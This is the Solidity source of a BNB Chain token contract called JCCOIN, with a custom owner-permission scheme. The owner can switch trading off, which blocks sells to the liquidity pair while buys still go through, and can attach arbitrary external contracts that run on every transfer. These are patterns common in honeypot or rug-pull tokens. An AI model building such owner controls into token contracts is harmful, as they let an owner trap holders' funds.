/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract permission {
    mapping(address => mapping(string => bytes32)) private permit;

    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }

    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode("null"))); }

    function checkpermit(address adr,string memory str) public view returns (bool) {
        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }
    }
}

interface IAUTOMATEMAKETMAKER {
    function onTransfer(address from,address to, uint256 amount) external;
}

contract ERC20CodeLess is permission {

    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed from, address indexed to, uint amount);

    string public name = "JCCOIN";
    string public symbol = "JCCOIN";
    uint256 public decimals = 18;
    uint256 public totalSupply = 55_000_000_000 * (10**decimals);

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;

    address public pair;
    IAUTOMATEMAKETMAKER public before_amm;
    IAUTOMATEMAKETMAKER public after_amm;
    bool public beforeTokenTransfer = false;
    bool public afterTokenTransfer = false;

    bool public enabletrading = true;
    bool public maxtx = false;
    bool public istrigger = false;
    
    constructor() {
        balances[msg.sender] = totalSupply;
        newpermit(msg.sender,"owner");
        newpermit(msg.sender,"exclude_maxtx");
    }
    
    function balanceOf(address adr) public view returns(uint) { return balances[adr]; }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender,to,amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public returns(bool) {
        allowance[from][msg.sender] -= amount;
        _transfer(from,to,amount);
        return true;
    }
    
    function approve(address to, uint256 amount) public returns (bool) {
        require(to != address(0));
        allowance[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return true;
    }

    function _transfer(address from,address to, uint256 amount) internal {
        require(to != address(0));
        if(istrigger){
            return _basictransfer(from,to,amount);
        }else{
            if(to==pair && pair!= address(0)){
                require(enabletrading,"!ERROR : TRADING WAS PAUSE");
                if(maxtx && !checkpermit(from,"exclude_maxtx")){
                    require(amount<totalSupply/1000,"!ERROR : MAX TAX 0.1%");
                }
            }

            if(beforeTokenTransfer){
                istrigger = true;
                before_amm.onTransfer(from,to,amount);
                istrigger = false;
            }

            balances[from] -= amount;
            balances[to] += amount;

            if(afterTokenTransfer){
                istrigger = true;
                after_amm.onTransfer(from,to,amount);
                istrigger = false;
            }

            emit Transfer(from, to, amount);
        }
    }

    function _basictransfer(address from,address to, uint256 amount) internal {
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function settingpair(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        pair = adr;
        return true;
    }

    function maxtxSwitch() public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        maxtx = !maxtx;
        return true;
    }

    function changeTradingState() public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        enabletrading = !enabletrading;
        return true;
    }

    function setBeforeTokenTransfer(address adr,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        before_amm = IAUTOMATEMAKETMAKER(adr);
        beforeTokenTransfer = flag;
        return true;
    }

    function setAfterTokenTransfer(address adr,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        after_amm = IAUTOMATEMAKETMAKER(adr);
        afterTokenTransfer = flag;
        return true;
    }

    function excludemaxtx(address adr,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        if(flag){ newpermit(adr,"exclude_maxtx"); }else{ clearpermit(adr,"exclude_maxtx"); }
        return true;
    }

    function transferOwnership(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        newpermit(adr,"owner");
        clearpermit(msg.sender,"owner");
        return true;
    }
}